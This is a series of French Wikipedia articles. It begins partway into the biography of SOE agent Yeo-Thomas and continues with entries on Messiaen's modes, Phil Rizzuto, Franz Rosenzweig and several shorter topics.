Après la défaite de la France et à la veille des évacuations chaotiques de Dunkerque, il s’échappe (via Paris, Tours, Limoges, Bordeaux, la Pointe de Grave). Juste avant le départ, il envoie une carte postale à une amie d'enfance, Josée Dupuis, où il écrit : « Nous reviendrons. » Il retourne par cargo en Angleterre. Il commence par travailler comme interprète à Odiham dans le Hampshire, où sont formés les pilotes français des FAFL.
En octobre, il est promu officier, et affecté comme officier de renseignements à la de chasse polonaise libre (Krakowski), à Badington, près de Coventry.
Entrée au SOE.
En 1942, il rencontre Eric Piquet-Wicks, le chef de la section RF du Special Operations Executive (SOE), qui le recrute. Le , il devient officier de liaison entre le SOE et le Bureau central de renseignements et d'action (BCRA), agence de renseignements de la France libre. Très vite lui sont confiés la planification et le briefing des agents. Yeo-Thomas établit des liens avec Pierre Brossolette et André Dewavrin (nom de code « Passy »). Mais son activité de bureau ne lui convient pas, et il voudrait participer plus activement. Il obtient d'effectuer une mission en France.
Première mission en France : Arquebuse - Brumaire (opération SEAHORSE).
En 1943, il est désigné pour faire sa première mission en France : il accompagne André Dewavrin « Passy », chef du BCRA, (mission Arquebuse) et Pierre Brossolette, son adjoint (mission Brumaire). Ils enquêtent sur la Résistance dans l'ex-zone occupée, ses capacités paramilitaires, ses projets politiques et sa position vis-à-vis du général de Gaulle, ainsi que sur l’état d’esprit des Français. Ils doivent voir divers agents en opérations et renouveler ou préciser leurs instructions.
Dans la nuit du 25 au , il est parachuté en France avec « Passy ». Brossolette est déjà là depuis le . Il fait preuve de courage et d’initiative durant sa mission, notamment en permettant à un officier français qui était suivi par un agent de la Gestapo à Paris de se retrouver en sûreté et de reprendre son activité clandestine ailleurs. Il prend aussi en charge le capitaine Ryan, un pilote américain dont la forteresse volante a été descendue et qui, ne parlant pas français, court le risque d’être capturé.
Dans la nuit du 15 au , il retourne en Angleterre par Lysander, avec « Passy », Brossolette et l’officier américain.
En sept semaines, la mission Arquebuse-Brumaire a mis en place les éléments essentiels de l'unification de la Résistance en France, en obtenant l'accord pour la mise en place d'une organisation militaire qui réunisse tous les mouvements (préparant ainsi la future Armée secrète), en obtenant également la création du Comité de coordination des mouvements de Résistance de la zone Nord, ainsi qu'un accord sur la création et la composition du CNR.
Yeo-Thomas, quant à lui, a eu l'occasion de prendre des contacts personnels avec de nombreux responsables des mouvements de Résistance, et de resserrer les liens d'amitié qui l'unissent déjà à Dewavrin et Brossolette. Il a pu découvrir aussi les problèmes qui ont pu naître de l'opposition parfois manifeste entre Pierre Brossolette et Jean Moulin, et de l'autorité dont ce dernier faisait preuve à l'égard du général Delestraint. À Londres, les rapports de Yeo-Thomas sur les forces résistantes et sur les sentiments gaullistes nourris par nombre de Résistants et de Français confortent ceux qui s’opposent à ce que Winston Churchill cède aux Américains et lâche de Gaulle.
Le , le général de Gaulle demande à le voir et lui dit : « Je vous félicite pour votre mission… Je vous remercie pour ce que vous avez fait pour la France. »
Le , est annoncée l'arrestation du général Delestraint, et le 21, celle de Jean Moulin. Tout repose alors en France, pour les services français, sur les épaules de Claude Bouchinet-Serreulles, qui a été parachuté le 16 comme assistant de Moulin et qui a eu la chance de manquer, à Lyon, le rendez-vous qui devait lui permettre de participer à la réunion de Caluire chez le docteur Dugoujon. Le , Jacques Bingen arrive en France comme délégué du CFLN pour l'ex-zone libre. Londres voulant faire le point de la situation sur place après tous ces événements, renvoie Brossolette et Yeo-Thomas.
Deuxième mission en France (opération MARIE-CLAIRE).
L'objectif est de recenser les moyens de l’action armée en France et les besoins en armes des maquis, et travailler au renforcement de l’organisation paramilitaire de la Résistance.
Dans la nuit du 18 au , Yeo-Thomas et Brossolette sont déposés en Lysander près d'Angoulême. Peu après leur arrivée, de nombreux patriotes sont arrêtés. Sans se laisser décourager, ils continuent les enquêtes et obtiennent des renseignements qui permettent de rectifier la situation. En six occasions, Yeo-Thomas manque d’être arrêté. Il insiste pour que la Délégation générale respecte la consigne de Londres pour que Daniel Cordier et un de ses collaborateurs rentrent à Londres, sans succès.
Le , ils réunissent à Paris les responsables des mouvements et ceux du Bureau des opérations aériennes en zone nord pour une séance de conciliation. Les 26 et 27, ils réunissent les chefs régionaux de zone sud du Service national maquis, puis le Comité militaire de zone nord. Le novembre, à la suite du démantèlement de nombreux réseaux parisiens consécutifs à l'affaire dite « de la rue de la Pompe » (siège de la Délégation générale), Yeo-Thomas recommande le rappel de Bouchinet-Serreulles. Le 2, il part en tournée avec Michel Brault, chef national du service des maquis, pour se faire une idée des formations existantes et de leurs besoins. Tandis que Brossolette reste sur place, Yeo-Thomas est rappelé à Londres. Il retourne seul en Angleterre par Lysander dans la nuit du 15 au 16. Il apporte des archives du Renseignement britannique qu’il sauve d’une maison surveillée par la Gestapo.
Soutien de la résistance à Londres.
Yeo-Thomas devient l'adjoint de L. H. Dismore, qui a pris le commandement de la section RF. Il est aussi chargé de la liaison avec les opérations sur le terrain. Il est pleinement occupé, mais il n'est pas tranquille : il ne parvient pas à se rassurer sur le sort de Brossolette, et il se fait souci de l'insuffisance des moyens donnés aux maquis français. Il sait que le rapport qu'il a fait à ce sujet n'aboutira pas assez vite par la voie hiérarchique, et il s'en ouvre à un vieil ami de sa famille, le général Ernest Swinton, qui, bien qu'à la retraite, a encore du poids (il a été le promoteur des blindés et l'inventeur du tank).
Grâce à l'appui du général Swinton, le , Yeo-Thomas est convoqué au 10, Downing Street. Pendant une heure, il plaide auprès de Winston Churchill en faveur de la Résistance. Churchill, fortement impressionné, se rend à ses arguments. Au même moment, Emmanuel d'Astier de la Vigerie fait une démarche analogue, de même que Lord Selborne, car Brault est revenu de France entre-temps et a su persuader l'état-major du SOE. Churchill donne les instructions pour augmenter les moyens et deux jours après, la section RF sait qu'elle pourra disposer désormais de davantage d'avions : 22 Halifax, 12 Liberators, 36 Stirlings, 6 Albermarles et de nombreux petits avions.
Peu après Yeo Thomas apprend l'arrestation de Brossolette et Émile Bollaert . Pour Yeo-Thomas, la situation est critique, car les Allemands, même s’ils ignorent que c'est Brossolette qu'ils ont fait prisonnier, savent que dans sa chevelure foncée il y a une mèche blanche. Yeo-Thomas veut retourner en France pour délivrer Brossolette de la prison de Rennes avant que sa mèche teinte ne le trahisse en retrouvant sa couleur naturelle. Il s'arrange, avec l'aide de Dismore, pour se faire à nouveau envoyer en France.
Troisième mission en France (opération ASYMPTOTE).
Sous le nom de guerre « Shelley », son intention réelle est de faire évader Pierre Brossolette.
Compte tenu de l’urgence, Yeo-Thomas choisit de sauter par nuit noire plutôt que d’attendre la prochaine pleine lune. C’est ainsi dans la nuit du 24 au qu’il est de nouveau parachuté en France aux alentours de Clermont-Ferrand. Il prépare le coup de main contre la prison de Rennes avec l'aide de Brigitte Friang. En dépit des précautions de sécurité, il est trahi. À la suite des aveux de Pierre Manuel, plusieurs personnes sont arrêtées, dont l'agent de liaison qu'il devait rencontrer le . Alors qu'il a rendez-vous ce jour-là à 11 heures avec ce contact à la station de métro Passy à Paris, il est capturé par la Gestapo. Il est emmené au quartier général du 82 Avenue Foch et y est poussé dans un bureau aux cris de "« Wir haben Shelley ! »". Se voyant identifié, il applique les consignes : il décline son identité véritable et reconnaît sa qualité d'officier britannique, avec le grade de "squadron leader" dans la RAF. Bien que cela lui permette, en théorie, de bénéficier des lois de la guerre, il est soumis pendant quatre jours à la torture brutale qui ponctue son interrogatoire par Ernst Misselwitz: immersion dans l’eau glacée (qui exige ensuite une respiration artificielle), pieds et bras enchaînés, électrocution des parties génitales, innombrables passages à tabac.
Cette troisième mission est un échec : non seulement Yeo-Thomas est arrêté, mais Pierre Brossolette, que les Allemands ont fini par identifier et ramené à Paris, sous la torture et ne voulant pas parler, s'est suicidé le en se jetant par la fenêtre.
L’interrogatoire de Yeo-Thomas se poursuit pendant deux mois. Les Allemands lui proposent la liberté contre des renseignements sur le chef du secrétariat de la Résistance. Blessé par les chaînes qui lui lient les poignets, il contracte une gangrène qui manque de lui faire perdre le bras gauche. Il fait deux tentatives d’évasion, osées mais infructueuses. Il est alors envoyé à la prison de Fresnes en isolement, dont quatre semaines au mitard.
Le , n’ayant fourni aucune information, il est transféré au camp de Royallieu à Compiègne, d’où il cherche à s’échapper à deux reprises.
Déportation.
Le , avec 36 autres prisonniers il est déporté au camp de concentration de Buchenwald en Thuringe. Sur le chemin, ils s’arrêtent à Sarrebruck, où on les bat et on les garde dans une minuscule cabane, avant de repartir vers Buchenwald. Le 16, ils arrivent au camp.
Le , seize d'entre eux sont exécutés.
En octobre, sur l'initiative d’Alfred Balachowsky, Yeo-Thomas met au point, avec des responsables du camp, la substitution d'identité de trois d'entre eux avec trois autres prisonniers, morts du typhus : Harry Peulevé prend l'identité de Marcel Seigneur, Stéphane Hessel celle de Michel Boitel et lui-même celle de Maurice Chouquet.
Au début du mois de novembre, Peulevé et Hessel sont envoyés dans un petit "kommando", à Schönbeck. Et le 8, Yeo-Thomas est envoyé au "kommando" Wille à Gleina.
En , il est transféré au camp de Rehmsdorf en Saxe-Anhalt. En tentant de s’échapper, il est intercepté par une patrouille allemande. Se prétendant sous-officier français, il est transféré dans un camp pour prisonniers de guerre français près de Marienburg.
Le , il conduit un groupe de vingt prisonniers dans une tentative d’évasion extrêmement courageuse, en plein jour. Dix sont tués par les gardiens. Les autres se dispersent en petits groupes. Yeo-Thomas se sépare de ses compagnons après trois jours sans nourriture. Il continue seul pendant une semaine. Il est repris à des lignes américaines.
Quelques jours plus tard, il s’échappe avec un groupe de dix prisonniers français, qu’il conduit au milieu des patrouilles allemandes jusqu’aux lignes américaines.
Le , le jour même de la capitulation allemande, il arrive à Paris. Il dîne en compagnie du major Thackwaite et de Josée Dupuis, au club des officiers britanniques du faubourg Saint-Honoré.
Après la guerre.
Au procès de Nuremberg qui se tient en 1946, Yeo-Thomas est un témoin important pour identifier les responsables du camp de Buchenwald. Le dernier jour du procès du commando allemand Otto Skorzeny, le , son témoignage contribue à l'abandon d'un chef d'accusation, celui de port d'uniforme ennemi, et finalement à l'acquittement de Skorzeny.
Il quitte l'armée avec le grade de "Wing Commander". Il reprend un travail dans une maison de couture parisienne en 1946 ; et en 1950, il devient le délégué pour la France de la "Federation of British Industries".
Le , âgé de , il meurt dans son appartement parisien (3, rue des Eaux) des suites d’une hémorragie. Après sa crémation, ses cendres sont enterrées au cimetière de Brookwood, dans le Surrey, dans le Jardin du Souvenir “Pine Glade”.
Identités.
Parcours militaire :

</doc>
<doc id="1872943" url="https://fr.wikipedia.org/wiki?curid=1872943" title="Modes à transposition limitée">
Modes à transposition limitée

Les modes à transposition limitée sont des modes musicaux possédant certaines propriétés de symétrie et de répétition sur un nombre limité de transpositions. Ces modes sont au nombre de 15 (7 sont utilisés par Messiaen) et retrouvent leur forme initiale après 2, 3, 4 ou 6 transpositions.
Ils ont été codifiés pour la première fois par le compositeur Olivier Messiaen dans son livre "Technique de mon langage musical". Il les étudia en même temps sous leurs aspects harmoniques et mélodiques.
Il faut ajouter aussi que les deux premiers modes : la gamme par tons (Mode 1) et la succession demi-tons tons (Mode 2) ont été utilisés bien avant leur théorisation par Messiaen, par des compositeurs tels que Vincent d'Indy ("Diptyque méditerranéen pour orchestre"), Claude Debussy (nombreuses œuvres), Maurice Ravel, Rimski-Korsakov ("Schéhérazade") pour la gamme par tons ; et par Franz Liszt ("Après une lecture de Dante" ou "Feux Follets"), Wagner ("Tristan et Isolde"), Rachmaninoff ("Sonate pour violoncelle et piano"), César Franck ("Sonate" pour piano et violon), Debussy, pour le deuxième mode. Celui-ci avait au été théorisé sous le nom de « Mode de Bertha », et est couramment appelé au « Mode diminué » (jazz), « Mode octotonique » ou « octatonique ». Même le se retrouve une fois dans le de la "Sonate" pour violoncelle et piano de Rachmaninoff, et le dans le prélude de Debussy "La Terrasse des audiences du clair de lune" ainsi que dans le « leitmotif du Désir Ø dans "Tristan et Isolde" de Wagner. Fondés sur l'échelle chromatique de douze notes, ces modes sont constitués de plusieurs groupes symétriques qui structurent l'octave en parties égales ou en intervalles égaux, la dernière note de chacun étant la première du suivant.
La transposition chromatique (c'est-à-dire d'un demi-ton supérieur ou inférieur) applicable à chacun de ces modes est limitée en nombre, car la transposition suivante aboutit à la restitution de la gamme de départ. Par exemple le premier mode (qui comporte les notes "do", "ré", "mi", "fa #", "sol #", "la #", "do") ne peut être transposé qu'une seule fois d'un demi-ton supérieur (ou inférieur). La transposition d'un demi-ton supérieur donnant "do #", "ré #", "fa", "sol", "la", "si", "do #", une nouvelle transcription aboutirait à "ré", "mi", "fa #", "sol #", "la #", "do", "ré", c'est-à-dire exactement la gamme de départ.
Définition.
Il y a deux manières complémentaires de voir ces modes : selon leurs transpositions possibles ou selon les différents modes qu'ils représentent.
Construction par transposition chromatique.
Les modes à transposition limitée ont tous moins de 12 transpositions par demi-tons (les modes majeurs et mineurs en ont exactement 12).
Par exemple, le "Mode 1" de Messiaen n'a que deux transpositions : en transposant l'échelle "do ré mi fa♯ sol♯ la♯" d'un demi-ton, on obtient "do♯ ré♯ fa sol la si" ; si on transpose une seconde fois d'un demi-ton on retombe sur la première échelle.
Construction des modes par degrés.
Le mode majeur est caractérisé par la suite d'intervalles : ton, ton, demi-ton, ton, ton, ton, demi-ton. Selon le degré de départ dans cette suite, on construit un mode différent. Avec cette technique on obtient pour les modes de Messiaen un nombre limité d'échelles.
Par exemple, le "Mode 1" de Messiaen qui est défini par les intervalles "ton, ton, ton, ton, ton, ton" donne toujours la même suite quel que soit le degré de départ : il ne contient qu'un seul mode.
De même, le "Mode 2" de Messiaen défini par la séquence "demi-ton, ton, demi-ton, ton, demi-ton, ton, demi-ton, ton" ne donne que deux suites différentes (commençant soit par un ton soit par un demi-ton) et ne contient donc que deux modes distincts.
Les sept modes de Messiaen.
Premier mode.
Le "premier mode" de Messiaen, aussi appelé gamme par tons, est constitué de six secondes majeures. Il est défini par les intervalles : "ton, ton, ton, ton, ton, ton". Il a deux transpositions et un mode. Ce mode n'est pas une invention de Messiaen, mais existait déjà dans la littérature musicale : Mikhaïl Glinka ("Rouslan et Ludmila"), Franz Liszt, Rimski-Korsakov ("Le coq d'or"), et surtout Vladimir Rebikov, Claude Debussy et Béla Bartók (qui le considérait comme un mode intermédiaire entre le diatonisme et le chromatisme) l'ont abondamment utilisé avant Messiaen.
Deuxième mode.
Le "second mode" ou échelle octotonique est divisé en quatre groupes de trois notes chacun. Il a trois transpositions, comme l'accord de septième diminuée.On peut donc y enchaîner quatre septièmes ou neuvièmes mineures de dominante à distance de tierces mineures.
Il est également appelé « mode demi-diminué », mode « demi-ton − ton » ou « mode de Bertha ». On le trouve déjà dans la première ballade de Chopin op. 23.
Troisième mode.
Le "troisième mode "(échelle nonatonique) est divisé en trois groupes de quatre notes chacun. Il a quatre transpositions, comme l'accord de quinte augmentée. On peut y enchaîner trois septièmes ou neuvièmes majeures de dominante à distance de tierces majeures. Notons que la gamme par tons ( mode) s'y trouve incluse.
Quatrième au septième modes.
Les "quatrième", "cinquième", "sixième" et "septième modes" ont six transpositions chacun, comme le triton.
Intervalles des modes.
Alors que la gamme majeure a pour motif "T T 1/2T T T T 1/2T", soit, en nombre de demi-tons "2 2 1 2 2 2 1" (dont la somme couvre les 12 demi-tons de l'octave), les modes à transposition limitée ont pour motif:
Analyse.
Propriétés musicales.
La symétrie inhérente à ces modes (signifiant qu'aucune note ne peut être perçue comme la tonique), de même que certains dispositifs rythmiques comme les rythmes non rétrogradables, fut décrite par Messiaen comme « le charme des impossibilités ». Cette symétrie produit un « effet couleur de vitrail » aux dires du compositeur et crée une ambiguïté harmonieuse entre plusieurs tonalités d'où une polytonalité. Par exemple, le deuxième mode contient 4 septièmes de dominante. On peut aussi considérer que, contrairement aux séries dodécaphoniques qui procèdent d'une permutation d'un nombre donné de notes, les modes à transposition limitée procèdent d'une combinaison de notes.
Propriétés mathématiques.
Il est bon de remarquer qu'il existe d'autres modes satisfaisant les définitions ci-dessus. Mathématiquement, on peut même considérer les deux cas extrêmes de la gamme chromatique et de l'ensemble vide (utilisé au moins dans 4'33" de John Cage). Les 7 modes trouvés par Messiaen et les autres sont inclus les uns dans les autres selon une structure de treillis. En effet, tous ces modes sont les invariants de groupes de transpositions, et sont des réunions d'orbites des actions de ces groupes. En gardant ceux de ces modes qui ont au moins deux notes et au plus 10, on en trouve 15. En voici la liste classée par la plus petite transposition qui laisse le mode invariant, et donnée par nombre de demi-tons. Les 7 modes de Messiaen y figurent en gras.
En voici une représentation graphique sous forme d'horloges.
Extensions.
La propriété d'admettre un nombre limité de transpositions se généralise à d'autres échelles que la division de l'octave en 12 notes, et en particulier aux échelles microtonales. Par exemple, il y a 380 modes à transpositions limitées dans un tempérament à 24 notes par octaves.

</doc>
<doc id="1872944" url="https://fr.wikipedia.org/wiki?curid=1872944" title="Rétrocompatible">
Rétrocompatible



</doc>
<doc id="1872945" url="https://fr.wikipedia.org/wiki?curid=1872945" title="Glossopsitta">
Glossopsitta

Le genre Glossopsitta contient un espèces d'oiseaux du groupe des loris appartenant à la famille des Psittacidae et qui se rencontrent en Australie.
Liste des espèces.
D'après la classification de référence (version 6.4, 2016) du Congrès ornithologique international (ordre phylogénique) :

</doc>
<doc id="1872947" url="https://fr.wikipedia.org/wiki?curid=1872947" title="Comté de Franklin (Kansas)">
Comté de Franklin (Kansas)

Le comté de Franklin, en , est l’un des 105 comtés de l’État du Kansas, aux États-Unis. Fondé le , il porte le nom de Benjamin Franklin.
Siège et plus grande ville : Ottawa.

</doc>
<doc id="1872948" url="https://fr.wikipedia.org/wiki?curid=1872948" title="Doris Mable Cochran">
Doris Mable Cochran

Doris Mable Cochran est une herpétologiste américaine, née le à North Girard (Pennsylvanie) et morte le à Hyattsville (Maryland).
Biographie.
Elle étudie à l’université George Washington où elle obtient son "Bachelor of Arts" en 1920 et son "Master of Sciences" en 1921. Durant ses études, elle commence à collaborer avec l’U.S. National Museum of Natural History où elle succède à Frank Nelson Blanchard (1888-1937). Elle assume la responsabilité des collections herpétologiques, leur conservateur officiel, Leonhard Hess Stejneger (1851-1943) étant lourdement occupé par des tâches administratives. Elle n’assumera officiellement la fonction de conservatrice qu’après la mort de Stejneger. Elle obtient son doctorat en 1933 à l’université du Maryland. C’est une spécialiste de la faune néotropicale et décrit plus d’une centaine de taxons dans près de cent publications. Outre ses travaux scientifiques, elle fait paraître de nombreuses publications de vulgarisation.

</doc>
<doc id="1872955" url="https://fr.wikipedia.org/wiki?curid=1872955" title="Échangeur Aalbeke">
Échangeur Aalbeke



</doc>
<doc id="1872962" url="https://fr.wikipedia.org/wiki?curid=1872962" title="Strange Parallel">
Strange Parallel

Strange Parallel est un court métrage documentaire américain, réalisé par Steve Hanft, sorti en 1998.
Le film, dont le sujet principal est le chanteur américain Elliott Smith, comporte des interview d'Elliott Smith lui-même, de fans, d'amis et autres connaissances (dont le réalisateur Gus van Sant). Le film comporte également des extraits musicaux interprétés par Smith ainsi que des séquences en studio lors de l'enregistrement de la chanson "Brand New Game" (inédite à ce jour). Par moments le film s'éloigne de la réalité, avec quelques scènes jouées et des séquences humoristiques, notamment celle où Elliott Smith envisage d'acheter une main de robot pour améliorer sa musique.
Les scènes de ce film se déroulent principalement à New York et à Portland dans l'Oregon, ville dont est originaire le chanteur.
Ce film a été réalisé dans un but uniquement promotionnel et n'est pas disponible à l'achat.

</doc>
<doc id="1872969" url="https://fr.wikipedia.org/wiki?curid=1872969" title="Phil Rizzuto">
Phil Rizzuto

Philip Francis Rizzuto (né Fiero Francis Rizzuto le à Brooklyn, New York et décédé le à West Orange (New Jersey)) était un joueur américain de baseball qui a joué toute sa carrière avec les Yankees de New York en Ligue majeure de baseball. Surnommé "Scooter", il est devenu commentateur sportif des Yankees pendant 40 saisons après sa carrière de joueur. Il évolua en Ligue majeure aux New York Yankees de 1941 à 1956 et est membre du Temple de la renommée du baseball depuis 1994.
Carrière de joueur.
Né à Brooklyn, Phil Rizzuto rejoint les New York Yankees en 1937. Il passe trois saisons en ligues mineures puis débute avec les Yankees en ligue majeure en 1941. Sa carrière est entravée par la Seconde Guerre mondiale de 1943 à 1945 qu'il passe dans l'US Navy.
Après la guerre, il s'affirme un joueur excellent qui termine deuxième du classement du Meilleur joueur en 1949 avant de remporter la distinction en 1950. Il reçoit même cette année-là le premier Hickok Belt récompensant le meilleur sportif professionnel toutes disciplines confondues. Il est également sélectionné à cinq reprises en équipe des étoiles.
En hommage à sa carrière de joueur, son numéro 10 fut retiré par l'organisation des Yankees le . Il fit ensuite son entrée au Temple de la renommée du baseball en 1994.
Carrière de commentateur sportif.
Un an après avoir pris sa retraite sportive, Phil Rizzuto commence sa carrière de commentateur sportif au sein de l'organisation des Yankees. Il collabore avec des légendes de la discipline tels Mel Allen (1957-64 and 1982-85) et Red Barber (1957-66).
C'est Phil Rizzuto qui commenta le fameux de circuit de Roger Maris durant l'été 1961.
Il reste fameux pour l'emploi d'expressions telles que "Unbelievable!" ("incroyable!") "Holy Cow!" (Ah! La Vache!) ou "Did you see that?" ("avez-vous vu ça?") pour décrire une belle action, et appelait tout le monde "huckleberry".
Il reste pendant quarante ans la voix des New York Yankees, loin devant Mel Allen (29 ans). Il arrête sa seconde carrière en 1996 peu après le décès de Mickey Mantle. Il ne voulait pas assurer le commentaire du match programmé le jour de l'enterrement de Mantle, mais il y fut contraint par sa hiérarchie. Il quitta son poste de commentateur en pleine partie et arrêta sa carrière dans la foulée après sept décennies au service des New York Yankees.

</doc>
<doc id="1872970" url="https://fr.wikipedia.org/wiki?curid=1872970" title="Franz Rosenzweig">
Franz Rosenzweig

Franz Rosenzweig ( ) est un philosophe et théologien juif allemand des (Cassel, - , Francfort-sur-le-Main).
Né dans une famille juive assimilée à la culture allemande dont de nombreux membres se sont convertis au christianisme, il est tenté lui-même de suivre cette voie avant d’effectuer un retour au judaïsme et d'en faire la base de son œuvre philosophique.
Biographie.
Franz Rosenzweig est né à Cassel, le . Il est le fils unique de Georg et Adèle Rosenzweig. Il grandit dans une famille juive d'industriels aisés. La mère est férue d’art et de littérature. L’observance juive de la famille se limite à la Bar-Mitzvah et aux grandes fêtes religieuses.
Rosenzweig étudie à l'université la médecine, l'histoire et la philosophie. Sa thèse de doctorat de 1912 porte sur "Hegel et l’État" (publiée en 1920). La question qui traverse la thèse de Rosenzweig est celle de savoir si l’État universel hégélien est adéquat à la réalité de l’État-puissance. Il subit alors l'influence de l'historien Friedrich Meinecke puis d'Eugen Rosenstock-Huessy, juif converti au protestantisme.
Peu satisfait du rationalisme hégélien, il songe à se convertir au christianisme. Mais comme il veut que sa conversion soit celle d’un Juif et non d’un païen, Rosenzweig décide, en 1913, de passer une ultime journée de Kippour dans une synagogue berlinoise. L'office de Kippour le détourne de son idée première et le rapproche de son judaïsme. Puis sa participation directe à la guerre le confirme dans ses réserves à l’égard de la philosophie hégélienne de l’histoire qui justifie la mort des individus au nom de causes supérieures. Entre 1913 et 1921, il subit l'influence d'Hermann Cohen et entre en relation avec Martin Buber.
En 1917, Rosenzweig publie un manuscrit de la main de Hegel qu'il intitule « Le plus ancien programme de système de l'idéalisme allemand » ("Das älteste Systemprogramm des deutschen Idealismus"). Il y voit un texte de Schelling et ouvre un débat concernant l'attribution, car d'autres affirment, au contraire, qu'il s'agit d'un texte de Hegel, voire de Hölderlin.
Durant la Première Guerre mondiale, il écrit son œuvre maîtresse "L'Étoile de la Rédemption" ("Der Stern der Erlösung", 1921), considérée comme une contribution à la mystique et à sa théorie.
Il publie dans le même temps sa thèse en l’encadrant de quelques pages de préface et de conclusion qui montrent qu'il n'adhère plus du tout aux idées de sa jeunesse. Rosenzweig voit bien que les courants intellectuels dont il a été proche ne sont pas étrangers au développement du pangermanisme et de l'antisémitisme. Il fonde ensuite à Francfort une académie d'études juives pour adultes ("freies jüdisches Lehrhaus"), où enseignent les meilleurs savants juifs allemands.Franz Rosenzweig reste avant tout un Allemand, un juif allemand, intégré à la société allemande. Il écrit en 1923 : 
Paralysé les huit dernières années de sa vie par la sclérose latérale amyotrophique, il continue cependant à travailler. Il traduit des poèmes de Juda Halévy puis la Bible avec Martin Buber. Il continue à observer les préceptes pratiques du judaïsme.
La pensée de Franz Rosenzweig a eu un retentissement considérable sur l’intelligentsia allemande de l’entre-deux-guerres, notamment sur Martin Heidegger, Walter Benjamin et Gershom Scholem. Il a profondément influencé Emmanuel Levinas.
L'œuvre de Rosenzweig est restée confidentielle en France jusque dans les années 1980. Bernard-Henri Lévy fut l’un des premiers philosophes à signaler son importance. À sa suite, une nouvelle génération d’intellectuels, notamment Stéphane Mosès, Benny Lévy, Jean-Claude Milner, lui ont reconnu un rôle décisif dans l’histoire du judaïsme au et dans celle de la philosophie.
Franz Rosenzweig a souffert de la sclérose latérale amyotrophique ou maladie de Charcot. Vers la fin de sa vie, il n'a pu écrire qu'avec l'aide de sa femme, Edith. Elle récitait les lettres de l'alphabet jusqu'à ce qu'il lui indique la bonne par un clignement des yeux.
Philosophie.
Penser la guerre.
« Le traumatisme originel fut ici celui de la Première Guerre mondiale. Pour Rosenzweig, elle marque la fin d'une civilisation fondée sur la croyance en un ordre rationnel » selon Stéphane Mosès. « Mais c’est paradoxalement sur les décombres de la raison historique que l’espérance peut reprendre son essor ». Le retour de Rosenzweig au judaïsme .
« Alors que, pour Hermann Cohen, le peuple juif donne son sens ultime à cette idée d’histoire dont il est le créateur », pour Rosenzweig, au contraire, observe Sophie Nordmann, « le peuple juif est hors de l’histoire. Seul peuple qui échappe à la marche linéaire du temps, il est, affirme Rosenzweig, le peuple éternel». Le peuple singulier, distinct de ce qu’il appelle les « peuples du monde » : le seul peuple qui ne repose qu’en lui-même. « La vie dans le temps est interdite à ce peuple, au nom de la vie éternelle », constate Rosenzweig.
Penser contre Hegel.
Rosenzweig se bat sur deux fronts : celui de l'assimilation des juifs allemands à l'idéologie universalisante et fusionnelle promue en Allemagne depuis le . Et celui du sionisme auquel il se refuse à réduire le destin juif et dont il débat avec Gershom Scholem, en particulier.
Ce qui se joue, dans ce double refus, c’est le projet de « penser, contre Hegel, qu’il n’y a pas d’instance supérieure au tribunal de l’histoire », selon Bernard-Henri Lévy. « La thèse de Rosenzweig, c’est que le judaïsme est le mot manquant de l’hégélianisme. La preuve que l'hégélianisme ne marche pas, c’est la persistance du judaïsme […]. Si Hegel a raison, le judaïsme doit disparaître. Si le judaïsme ne disparaît pas, c’est que Hegel a tort ».
Qu’est-ce qui fait que le judaïsme reste toujours vivant, pour Rosenzweig ? C’est le rapport à la loi, le rapport à la langue, le rapport à la terre. Une loi plus importante, plus éminente que l’histoire. Une terre pour une large part imaginaire, ou qui ne peut être aimée concrètement que si elle a aussi un siège dans l’imaginaire. Une langue, enfin, qui garde en elle une part de sainteté. Ce sont les trois éléments qui, pour Rosenzweig, constituent la singularité juive.
Rosenzweig et la religion.
Le retour à l’étude des textes juifs joue un rôle essentiel chez Rosenzweig. Mais, au sens où il l’entend, ce retour au texte ne doit pas, pour autant, être confondu avec un « retour à la religion ». B-H Lévy souligne que, dans une lettre adressée à Rudolf Hallo, Rosenzweig résumait ainsi la tâche qu’il s’assignait : « "unreligios sein" (être a-religieux) », devise qu'il avait fait inscrire à l’entrée de sa maison d’études. L'étude importe plus que la foi. Lévy précise que, pour Rosenzweig, il ne s’agit évidemment pas d’être blasphématoire ; surtout pas indifférent. « Non, irréligieux. Refusant simplement, et jusqu’au bout, les facilités de l’effusion, de l’expansion, de la fuite dans le sentiment. »
Rosenzweig et la kabbale.
Rosenzweig accorde une place remarquable à la Kabbale dans sa philosophie. À partir des deux extrêmes, « le dieu-esprit judéo-grec » et « le dieu-homme judéo-chrétien », entre lesquels se comprend le judaïsme, selon lui, Rosenzweig cherche une autre voie. Il ne la trouve pas « dans les grotesques égarements de la Kabbale à ses débuts », mais « dans la Kabbale à son apogée, dans sa phase tardive ». Rosenzweig se réfère essentiellement à la kabbale lourianique, selon Moshé Idel.
Parallèlement à ses travaux en philosophie, Rosenzweig travaille à une traduction allemande de la Bible avec son ami, Martin Buber. Un autre de ses amis, Walter Benjamin, travaille de son côté à la traduction allemande d’"À la recherche du temps perdu" de Marcel Proust. Rosenzweig, Buber et Benjamin fondent une école de traducteurs où les concepts d’Isaac Louria (le "tsimtsoum", la "chevirat hakelim", le "tikkun olam") prennent une importance considérable en retentissant sur leur philosophie. Gershom Scholem est très lié à ce groupe. L’embryon de l’école scholémienne de la Kabbale se crée autour de Rosenzweig. Elle trouvera son lieu de prédilection à l’Université hébraïque de Jérusalem à fin des années 1920.
Penser le langage.
La pensée de Rosenzweig, axée sur la temporalité, requiert une nouvelle méthode, attentive au langage, selon les données qu'il trouve chez Isaac Louria. Le principe qui détermine l’analyse de l’existence humaine ne sera pas le logos (la raison), mais le langage lui-même, pour Rosenzweig. Mais comment penser le langage ?
Dieu, le monde, l’homme ; Création, Révélation, Rédemption.
Rosenzweig part de trois notions qui sont pour lui essentielles à toute pensée, à toute expérience et à toute réalité : Dieu, le monde, l'homme. Ces trois notions, inséparables, ne sont pas immobiles et sont mises en relation avec les trois notions que ce sont la création, la révélation et la rédemption. Symbolisés par deux triangles, ces notions se rejoignent et se recoupent à la manière d’une étoile transmise de génération en génération par l'étude de la littérature juive.
« Le judaïsme, dans la compréhension phénoménologique que Rosenzweig en a livré, souligne Bernard-Henri Lévy, ce n’est pas une identité biologique ; ce n’est pas seulement une identité religieuse et communautaire ; ce n’est évidemment pas une identité seulement nationale ; c’est une identité qui existe par l’étude et qui procède de l’étude ».
Judaïsme et christianisme.
Rosenzweig ne fait pas du judaïsme « l’ancêtre » du christianisme, puisque, précisément, il se situe hors de l'histoire. Le judaïsme et le christianisme constituent, pour lui, deux voies d’accès à la même vérité, deux voix d’accès fraternelles et égales en dignité.
Rosenzweig et Heidegger.
